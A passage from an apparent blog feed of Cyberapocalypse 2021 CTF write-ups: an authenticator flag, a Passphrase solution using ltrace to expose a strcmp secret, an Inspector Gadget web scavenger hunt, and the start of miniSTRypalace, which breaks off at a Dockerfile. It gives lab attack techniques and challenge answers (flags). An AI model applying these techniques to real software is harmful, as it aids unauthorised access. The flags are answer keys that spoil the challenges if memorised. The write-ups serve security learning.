<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./authenticator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Authentication System 👽</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your credentials to continue.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Alien ID: </span><span class="token number" style="color:#36acaa">11337</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Pin: th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Access Granted</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> Submit pin </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> the flag format: CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">fl4g_h3r3</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Flag:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Passphrase - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Passphrase challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Reverse.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Passphrase challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Reverse.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>You found one of their space suits forgotten in a room. You wear it, but before you go away, a guard stops you and asks some questions.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We get a binary executable passphrase. Running file on it, we see that it's not stripped, so we might get some symbols and good things out of it.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">file</span><span class="token plain"> passphrase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">passphrase: ELF </span><span class="token number" style="color:#36acaa">64</span><span class="token plain">-bit LSB shared object, x86-64, version </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">SYSV</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> GNU/Linux </span><span class="token number" style="color:#36acaa">3.2</span><span class="token plain">.0, BuildID</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">sha1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Running <code>strings</code> on it we don't see much, but we notice that we will probably have to deal with <code>strcmp</code>, which is good.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/passphrase-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>So, let's just run the executable using <code>ltrace</code>, and see where that leads us.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ltrace ./passphrase</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">omitted </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">30000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                           </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">void</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">Tell me the secret passphrase: "</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                          </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                                </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fgets</span><span class="token punctuation" style="color:#393A34">(</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So far, so good - it asks us for input using <code>fgets</code>. Let's supply it something random.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">fgets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">asd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">"asd</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">"</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">40</span><span class="token plain">, 0x7fbc87c48a00</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                      </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> 0x7ffe594faca0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"asd</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                         </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strcmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"3xtr4t3rR3stR14L5_VS_hum4n5"</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">"asd"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                            </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-46</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"</span><span class="token string entity" style="color:#36acaa">\033</span><span class="token string" style="color:#e3116c">[31m"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                      </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">strlen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">Intruder alert! </span><span class="token string entity" style="color:#36acaa">\360</span><span class="token string entity" style="color:#36acaa">\237</span><span class="token string entity" style="color:#36acaa">\232</span><span class="token string entity" style="color:#36acaa">\250</span><span class="token string entity" style="color:#36acaa">\n</span><span class="token string" style="color:#e3116c">"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                          </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">putchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10</span><span class="token plain">, 0x7ffe594f85e0, 0x558a2ee00c17, </span><span class="token number" style="color:#36acaa">23</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                         </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">30000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                                                                                                           </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">void</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">omitted </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Well, this was easy! It directly tells us that it compares the input string to  <code>3xtr4t3rR3stR14L5_VS_hum4n5</code>.To make sure, we run the binary again, and supply it that passphrase.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./passphrase </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Halt</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> ⛔</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> not </span><span class="token function" style="color:#d73a49">look</span><span class="token plain"> familiar</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Tell me the secret passphrase: 3xtr4t3rR3stR14L5_VS_hum4n5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">✔</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Sorry </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> suspecting you, please transfer this important message to the chief: CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">3xtr4t3rR3stR14L5_VS_hum4n5</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Easy, we got our flag, and it's</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">3xtr4t3rR3stR14L5_VS_hum4n5</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Inspector Gadget - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the Inspector Gadget challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the Inspector Gadget challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>Inspector Gadget was known for having a multitude of tools available for every occasion. Can you find them all?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We are given a url to a website, and upon opening it we see a big ol' <code>CHTB{</code> slapped right in our faces.</p>
<p><img loading="lazy" alt="ins gesicht" src="https://kblagoev.com/assets/images/insp3ct00000r-49a96a18d5e7ba100bce42b910a2c95c.png" width="1118" height="845" class="img_ev3q"></p>
<p>This clearly indicates, that we're facing a scavenger hunt. So, checking the HTML of the webpage, we find the next piece of the puzzle</p>
<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">&lt;!--1nsp3ction_--&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Surprisingly, <code>robots.txt</code> doesn't give us anything useful, so we look into  <code>/static/js/main.js</code> next.</p>
<div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"us3full_1nf0rm4tion}"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Just to make sure, we check whether <code>CHTB{1nsp3ction_us3full_1nf0rm4tion}</code> is the flag, and unsurprisingly it isn't.</p>
<p>So, we logically check the css next, and open <code>/static/css/main.css</code> to find</p>
<div class="language-css codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-css codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">/* c4n_r3ve4l_ */</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="solution">Solution<a href="https://kblagoev.com/blog/inspector-gadget-cyberapocalypse-2021-ctf#solution" class="hash-link" aria-label="Direct link to Solution" title="Direct link to Solution">​</a></h3>
<p>We can now easily deduce, that our flag is</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<!-- -->
<!-- -->
<div class="alert alert--primary" role="alert"><div class="card__body"><p>Thank you for reading!</p><p>The information in this blog, as well as all the tools, apps and libraries I develop are currently open source.</p><p>I would love to keep it this way, and you can help!</p><p>You can buy me a coffee from here, which will go towards the next all-nighter I pull off!</p><a href="https://www.buymeacoffee.com/kblagoev" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-violet.png" class="bmac_qmhE" alt="Buy Me A Coffee"></a><p>Or you can support me and my code monthly over at <a href="https://github.com/sponsors/tihawk" target="_blank">Github Sponsors!</a></p><p>Thanks!</p></div></div>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="Cyber Security" term="Cyber Security"/>
        <category label="CTF" term="CTF"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[miniSTRypalace - Cyberapocalypse 2021 CTF]]></title>
        <id>https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf</id>
        <link href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf"/>
        <updated>2021-04-29T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[This is a writeup for the miniSTRypalace challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.]]></summary>
        <content type="html"><![CDATA[<p>This is a writeup for the miniSTRypalace challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prompt">Prompt<a href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf#prompt" class="hash-link" aria-label="Direct link to Prompt" title="Direct link to Prompt">​</a></h3>
<p>Let’s read this website in the language of Alines. Or maybe not?</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://kblagoev.com/blog/ministrypalace-cyberapocalypse-2021-ctf#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h3>
<p>We get the source code for a website, and we're informed by a docker environment setup, that the flag will be at the root of the system.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Dockerfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[redacted]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Copy challenge files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COPY challenge /www</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COPY flag /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[redacted]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" 